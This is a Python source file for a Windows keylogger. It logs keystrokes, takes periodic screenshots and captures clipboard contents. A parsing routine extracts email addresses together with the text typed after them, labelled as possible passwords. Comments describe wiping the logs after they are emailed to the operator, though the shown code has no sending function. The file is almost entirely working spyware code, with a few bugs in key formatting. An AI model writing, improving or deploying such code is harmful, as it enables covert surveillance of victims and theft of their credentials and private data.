import os, shutil
import re
import time
from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread, Lock
import win32clipboard

'''
This class sets a time to execute a process on interval
'''
class FrequencyTimer(Timer):
    #this method controls the delays, @self : this instance of FrequencyTimer
    def start(self):
        while not self.finished.wait(self.interval):
            #create timer for program to use on interval
            self.function(*self.args, **self.kwargs)

'''
This class records keys typed on the keyboard and takes
screetshots. The captured keys are formated on a text file.
'''
class Keylogger:

    '''
    this method takes a keylogger instance and a key and
    writes the key to a file
    @self : this instance of Keylogger
    @key : the key that was pressed
    '''
    def _keyStrike(self, key):
        #open file
        global keylist
        #print("detected keypress")
        keylist.append(key)
        listSize = 75
        line = ""
        if len(keylist) > listSize:
            with open('./log/keylog/log.txt', 'a') as file:
                line = self.formatter(keylist)
                file.write(line)
                self.parseFile(line)
                keylist = []

    '''
    This methods formats the keys by stripping the quotes
    and also replaces the name of the key with its value
    in order to have more human readable string
    @self : this instace of Keylogger
    @keylist : the list of keys
    
    '''
    def formatter(self, keylist):
        string = ""
        #iterate through keys and format
        for k in keylist:
            key = str(k).replace("'","") #remove single quote formatting from keys
            #substitue key names for key values ( ex - Key.space = ' ')
            if key == 'Key.space':
                string = string + key.replace('Key.space', ' ')
            elif key == 'Key.enter':
                string = string + ' [ENTER]\n'
            elif key == 'Key.backspace':
                string == string + " [BS] "
            elif key == 'Key.tab':
                string == string + " [TAB] "
            elif key == 'Key.shift' or key == 'Key.shift_r':
                string == string + " [Sh] "
            else:
                string = string + '{0}'.format(key)
        return string + '\n'
                
    '''
    this method sets up the folders for saving
    the text file and screenshots images
    @self : this instance of Keylogger
    '''
    def _setupDir(self):
        if not os.path.exists('./log'):
            os.mkdir('./log') #create parent log directory
            os.mkdir('./log/keylog') #create directory for keylog text file
            os.mkdir('./log/screenshots/') #create directory for storing screenshots

    '''
    this method uses mms libary to take screenshots
    @self : this instance of Keylogger
    '''
    def _screenCapture(self):
        capture = mss() #create instance of mss
        capture.shot(output='./log/screenshots/{}.png'.format(time.time()))

    def _clipboardCapture(self):
        while True:
            time.sleep(20)
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            if data != '':
                with open('./log/keylog/clipboard_log.txt', 'a+') as file:
                        file.write('Clipboard data at {}'.format(time.asctime(time.localtime(time.time()))))
                        file.write('\n')
                        file.write(data)
                        file.write('\n\n')
            win32clipboard.CloseClipboard()
                
    '''
    this method "listens" for keyboard events
    '''
    def _keyScript(self):
        with Listener(on_press=self._keyStrike, suppress=False) as listener:
            listener.join()
    
    '''
    this method is the main method to run a keylogger instance
    @self : this instance of Keylogger
    @frequency : interval for screenshots , default is 1
    '''
    def exe(self, frequency = 7):
        self._setupDir()
        Thread(target=self._keyScript).start()
        Thread(target=self._clipboardCapture).start()
        FrequencyTimer(frequency, self._screenCapture).start()
        #FrequencyTimer(30, self.parseFile).start()

    '''
    this method parses our log file for emails and possible passwords
    and writes them to another file for easier reading
    @self : this instance of Keylogger
    '''  
      
    def parseFile(self, line):
        global lineBuffer
        #regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-.]{2,3}')
        previous = lineBuffer[len(lineBuffer)//2:] #split string in half and save second half
        lineBuffer = line #save line for next iteration
        line = previous + line #add the half of previous line to current line so regex text isnt cut off
        
        with open ('./log/keylog/parsed.txt', 'a+') as parsed:
            result = re.findall(  r'[\w\.-]+@[\w.-]' , line)
            if result:
                for email in result:
                    #parsed.write(email)
                    index = line.find(email)
                    subLine = line[index:] #create substring from start of email to end of line
                    index = subLine.find('.')
                    if(index + 4 < len(subLine)):
                        index = index + 4 #offset for .com/.net ect and dont overflow buffer

                    tail = subLine[index:]
                    password = tail.split()

                    parsed.write(subLine[:index] + '\t' + password[0] + '\n')
                    print('regex found: ', email)
            else:
                print ('no regex found ')
            parsed.close()

    

    '''
    this method will wipe our log file after we send it to our email
    (call from email function)
    '''
    def wipeFiles(self):
        os.remove('./log/keylog/log.txt')
        os.remove('./log/keylog/clipboard_log.txt')
        screenshots = './log/screenshots'
        for screenshot in os.listdir(screenshots):
            imagePath = os.path.join(screenshots, screenshot)
            try:
                if os.path.isfile(imagePath) or os.path.islink(imagePath):
                    os.unlink(imagePath)
                elif os.path.isdir(imagePath):
                    shutil.rmtree(imagePath)
            except OSError as e:
                continue
                
#main: create Keylogger instance and run it
if __name__== "__main__":
    keylist = [] #global list to format the output
    lineBuffer = " " #global line buffer extract regex strings 
    logger = Keylogger() # declare and intialze Keylogger object
    logger.exe()    # run keylogger

